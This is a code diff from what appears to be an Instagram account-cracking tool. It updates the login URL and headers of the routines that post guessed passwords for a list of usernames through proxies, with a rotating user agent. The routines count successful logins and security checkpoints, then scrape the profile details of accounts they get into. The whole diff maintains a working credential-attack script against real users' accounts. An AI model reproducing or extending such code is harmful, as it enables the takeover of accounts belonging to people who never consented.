@@ -691,7 +691,7 @@ class instagram:
                     'sec-fetch-site':'same-origin',
                     'sec-fetch-mode':'cors',
                     'sec-fetch-dest':'empty',
-                    'referer':'https://z-p42.www.instagram.com/api/v1/web/accounts/login/ajax/',
+                    'referer':'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                     'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                 param={
                     "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
@@ -700,7 +700,7 @@ class instagram:
                     "optIntoOneTap": 'false',
                     "stopDeletionNonce": "",
                     "trustedDeviceRecords": "{}"}
-                x=s.post("https://z-p42.www.instagram.com/api/v1/web/accounts/login/ajax/",headers=headers,data=param,proxies=proxs)
+                x=s.post("https://www.instagram.com/api/v1/web/accounts/login/ajax/",headers=headers,data=param,proxies=proxs)
                 x_jason=json.loads(x.text)
                 if "userId" in str(x_jason):
                     nama,pengikut,mengikut,postingan=self.APIinfo(user)
@@ -738,7 +738,7 @@ class instagram:
         global loop,success,checkpoint
         sys.stdout.write(f"\r{CY}[•] [{K}{loop}/{len(internal)}{C}] {H}[ OK : {len(success)}]{C}  {K}[ CP : {len(checkpoint)}]{C} "),sys.stdout.flush()
         try:
-            token=s.get("https://z-p42.www.instagram.com/api/v1/web/accounts/login/ajax/",headers={"user-agent":User_Agent()}).content
+            token=s.get("https://www.instagram.com/api/v1/web/accounts/login/ajax/",headers={"user-agent":User_Agent()}).content
             crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
             s.headers.update({
                 'authority': 'i.instagram.com',
@@ -754,7 +754,7 @@ class instagram:
                 'sec-fetch-site': 'same-origin',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-dest': 'empty',
-                'referer': 'https://z-p42.www.instagram.com/api/v1/web/accounts/login/ajax/',
+                'referer': 'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
             })
 
@@ -766,7 +766,7 @@ class instagram:
                 "stopDeletionNonce": "",
                 "trustedDeviceRecords": {}
             }
-            x=s.post("https://z-p42.www.instagram.com/api/v1/web/accounts/login/ajax/",data=param);sleep(1)
+            x=s.post("https://www.instagram.com/api/v1/web/accounts/login/ajax/",data=param);sleep(1)
             x_jason=json.loads(x.text)
             if "userId" in x.text:
                 nama,pengikut,mengikut,postingan=self.APIinfo(user)
